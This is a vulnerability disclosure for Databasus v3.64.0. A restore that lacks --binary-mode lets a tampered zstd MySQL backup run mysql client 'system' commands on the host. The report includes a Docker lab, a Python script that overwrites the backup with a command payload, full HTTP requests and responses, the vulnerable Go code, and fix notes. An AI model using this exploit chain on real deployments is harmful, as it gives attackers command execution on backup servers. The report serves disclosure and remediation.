### Vulnerability details

**Official website / Product:** https://databasus.com/

**Repository:** https://github.com/databasus/databasus (stars at selection: 9220)

**Vulnerability type:** RCE / getshell (MySQL restore lacks `--binary-mode`; client `system` / `\!` meta-commands execute on the Databasus host)

**Vulnerability versions:** v3.64.0 (tag `v3.64.0`, commit `7efbe9e` / `7efbe9eb9f34c436c4d08ef1162b6e9fbe095ab4`)

**Vulnerability URL / Parameter:** Authenticated `POST /api/v1/restores/:backupId/restore` with JSON `mysqlDatabase`; malicious zstd-compressed backup object in configured storage whose decompressed body contains mysql client `system` commands. Prerequisite: write access to the backup storage object (attacker-controlled S3/FTP/NAS credentials, or LOCAL volume object replace in the lab).

**Complex:** yes

### Verification procedure

Lab topology:

- Lab dir: `labs/databasus-r29-a5/` (if cleaned from the repo, rebuild from the compose below)
- Images: `databasus/databasus:v3.64.0` (verified image id `2c161762a655`), `mysql:8.4.6` (`c7fa03bf950b`)
- Containers: `r29a5-databasus`, `r29a5-mysql`; network `r29a5-net`
- Ports: Databasus host **20905** → container 4005; MySQL host **13306** → 3306 (inter-container hostname `r29a5-mysql:3306`)
- Volume: `./data:/databasus-data` (LOCAL storage objects land under `DataFolder`, `/databasus-data` in the official image)
- Credentials: admin `admin@r29a5.local` / `AdminPass123!`; restore-target MySQL user `backup` / `pass`, database `appdb`

Reproducible compose:

```yaml
services:
  databasus:
    image: databasus/databasus:v3.64.0
    container_name: r29a5-databasus
    ports: ["20905:4005"]
    volumes: ["./data:/databasus-data"]
    networks: [r29a5-net]
  mysql:
    image: mysql:8.4.6
    container_name: r29a5-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: appdb
    ports: ["13306:3306"]
    networks: [r29a5-net]
networks:
  r29a5-net:
    name: r29a5-net
```

1. Bring up the lab (use proxy `http://127.0.0.1:7890` for pulls if needed):

```bash
cd labs/databasus-r29-a5
docker compose up -d
# wait until r29a5-databasus is healthy. Expected docker ps shape:
# r29a5-databasus   databasus/databasus:v3.64.0   0.0.0.0:20905->4005/tcp   Up ... (healthy)
# r29a5-mysql       mysql:8.4.6                   0.0.0.0:13306->3306/tcp  Up ...
```

2. Prepare the restore-target MySQL user (matches the PoC body):

```bash
docker exec -i r29a5-mysql mysql -uroot -proot <<'SQL'
CREATE USER IF NOT EXISTS 'backup'@'%' IDENTIFIED BY 'pass';
GRANT ALL ON appdb.* TO 'backup'@'%';
FLUSH PRIVILEGES;
SQL
```

3. Sign up and sign in as admin (response JSON field `token` is used as `Authorization: Bearer …`; the JWT in the PoC below is the lab capture — replace with a freshly issued token when replaying):

```http
POST /api/v1/users/signup HTTP/1.1
Host: 127.0.0.1:20905
Content-Type: application/json
Accept: application/json

{"email":"admin@r29a5.local","password":"AdminPass123!","name":"admin"}
```

```http
POST /api/v1/users/signin HTTP/1.1
Host: 127.0.0.1:20905
Content-Type: application/json
Accept: application/json

{"email":"admin@r29a5.local","password":"AdminPass123!"}
```

4. Via UI or API: create a workspace → add **LOCAL** storage → add a MySQL database pointing at `r29a5-mysql:3306` / `appdb` / `backup`:`pass` → enable logical backups and produce at least one **COMPLETED** `LogicalBackup` (note the `backupId`; lab used `015ba430-b0ca-4134-a9fe-1fe7c7375f1b`). The backup object must be **unencrypted** zstd (or the attacker must also hold decryption metadata); the lab used an unencrypted LOCAL object.

5. As an attacker who can write backup object bytes, overwrite the stored object with a zstd frame whose decompressed SQL contains a mysql client meta-command. In production this is typically attacker-controlled S3/FTP/NAS; the lab uses an equivalent LOCAL volume replace:

```bash
# Inside the Databasus container, object path shape is:
# /databasus-data/storage/<storageId>/LogicalBackup/<yyyy-mm>/<file>.zst
# Then overwrite that path with a malicious zstd blob, e.g.:
docker exec -i r29a5-databasus python3 - <<'PY'
import zstandard as zstd, pathlib, glob
payload = b"system id > /tmp/RESTORE_RCE;\nSELECT 1;\n"
blob = zstd.ZstdCompressor().compress(payload)
# Replace with the actual COMPLETED backup object path:
path = pathlib.Path(glob.glob("/databasus-data/storage/*/LogicalBackup/*/*.zst")[0])
path.write_bytes(blob)
print("overwrote", path, "bytes", len(blob))
PY
```

Payload meaning: `system id > /tmp/RESTORE_RCE;` is executed by the **mysql client** on the Databasus host; `SELECT 1;` keeps subsequent server SQL successful so restore status can be `COMPLETED`.

6. Trigger restore (full messages below; swap `:backupId` / Bearer token / `mysqlDatabase` for current lab values):

`POST /api/v1/restores/<backupId>/restore`

7. Confirm impact:

```bash
docker exec r29a5-databasus sh -c 'cat /tmp/RESTORE_RCE; echo; ls -l /tmp/RESTORE_RCE'
```

Expected output:

```
uid=999(databasus) gid=999(databasus) groups=999(databasus),101(ssl-cert)
-rw-r--r-- 1 databasus databasus 74 Nov  1 23:24 /tmp/RESTORE_RCE
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /api/v1/restores/015ba430-b0ca-4134-a9fe-1fe7c7375f1b/restore HTTP/1.1
Host: 127.0.0.1:20905
User-Agent: curl/8.22.0
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIxMDg5MzU1MjgsImlhdCI6MTc5MzU3NTUyOCwicGFzc3dvcmRDcmVhdGlvblRpbWUiOjE3OTM1NzQ2MTEsInJvbGUiOiJBRE1JTiIsInN1YiI6ImJlYWQzODRmLTNhY2ItNGI3Ni05OTQyLWNmZGQ2M2VjYjJmYiJ9.Q4POnKa6_F-XisP6K6lIl5Z5csYi94Md5kZ3AaSS0IY
Content-Type: application/json
Content-Length: 125

{"mysqlDatabase":{"host":"r29a5-mysql","port":3306,"username":"backup","password":"pass","database":"appdb","isHttps":false}}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Content-Type: application/json; charset=utf-8
Expires: 0
Pragma: no-cache
X-Request-Id: 14753cd0-4979-44d6-a6e8-ccc7d3b3c311
Date: Sun, 01 Nov 2026 23:24:59 GMT
Content-Length: 42

{"message":"restore started successfully"}
```

Verification result notes:

- HTTP: `200` + `{"message":"restore started successfully"}`.
- Restore status `COMPLETED` in ~9–16 ms.
- Impact file `/tmp/RESTORE_RCE` content:
  ```
  uid=999(databasus) gid=999(databasus) groups=999(databasus),101(ssl-cert)
  -rw-r--r-- 1 databasus databasus 74 Nov  1 23:24 /tmp/RESTORE_RCE
  ```
- App log shape: `mysql --defaults-file=... --host=... --user=backup ... appdb` with **no** `--binary-mode`; stdin is zstd-decoded backup bytes.
- Prerequisite (storage object replace) is the zstd overwrite command in step 5 above.

### Vulnerability analysis

Databasus restores MySQL backups by streaming the stored object through optional decryption, then `zstd.NewReader`, into the stdin of the bundled `mysql` client (`exec.Command`, argv list — no shell). Arguments include host/user/port/ssl-mode/database but never `--binary-mode`.

The mysql client, when not in binary mode, treats lines such as `system ...` / `\! ...` as **client-side** commands and runs them via the process user’s shell before/alongside server SQL. An attacker who can supply backup object bytes (typical when the workspace uses attacker-controlled S3/FTP/NAS storage, or after compromising storage credentials; the lab simulates this by overwriting the LOCAL volume object) therefore gains OS command execution on the Databasus host as `databasus` (uid 999 in the official image), which is far beyond “run SQL on the restore target.”

Trigger / sink source (full path and line numbers relative to tag `v3.64.0`):

```go
# File: backend/internal/features/restores/usecases/mysql/restore_backup_uc.go
# Lines: 69-86 (args build, no --binary-mode) and 164-214 (executeMysqlRestore: zstd → stdin → Start)
	args := []string{
		"--host=" + my.Host,
		"--port=" + strconv.Itoa(my.Port),
		"--user=" + my.Username,
		"--verbose",
	}
	args = append(args, "--max-allowed-packet=1G")
	// ... ssl-mode / database name ...
	// NOTE: no --binary-mode

	fullArgs := append([]string{"--defaults-file=" + myCnfFile}, args...)
	cmd := exec.CommandContext(ctx, mysqlBin, fullArgs...)
	// ...
	zstdReader, err := zstd.NewReader(inputReader)
	// ...
	cmd.Stdin = decodedStreamFailureTracker
	if err = cmd.Start(); err != nil {
		return fmt.Errorf("start mysql: %w", err)
	}
```

Same pattern exists for the MariaDB restore usecase (`backend/internal/features/restores/usecases/mariadb/restore_backup_uc.go`): no `--binary-mode`, stdin is the zstd-decoded stream.

### Fix notes

- Pass `--binary-mode` (and prefer `--batch`) on every non-interactive `mysql`/`mariadb` restore invocation so client meta-commands are disabled.
- Optionally reject / strip client commands when validating backup streams.
- Treat backup storage as a trusted compute boundary: document that object-write on storage equals host RCE until the flag is fixed.
